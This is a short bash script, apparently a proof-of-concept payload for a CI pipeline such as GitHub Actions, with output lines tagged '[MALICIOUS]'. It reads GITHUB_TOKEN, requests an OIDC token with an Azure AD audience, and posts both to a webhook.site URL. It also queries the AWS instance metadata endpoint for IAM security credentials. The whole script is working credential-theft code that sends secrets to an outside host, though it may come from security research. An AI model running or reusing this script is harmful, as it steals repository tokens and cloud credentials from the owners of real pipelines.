#!/bin/bash
echo "[MALICIOUS] Payload executing..."
echo "[MALICIOUS] Current directory: $(pwd)"
echo "[MALICIOUS] User: $(whoami)"

# Try to get GITHUB_TOKEN (might be empty as we saw)
if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "[MALICIOUS] GITHUB_TOKEN found: ${GITHUB_TOKEN:0:10}..."
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "token=$GITHUB_TOKEN"
else
    echo "[MALICIOUS] GITHUB_TOKEN is empty"
fi

# Try OIDC token (the real target)
if [ ! -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
    echo "[MALICIOUS] OIDC request token found"
    OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "oidc_token=$OIDC_TOKEN"
fi

# Try cloud metadata (AWS)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: $TOKEN"

echo "[MALICIOUS] Done"
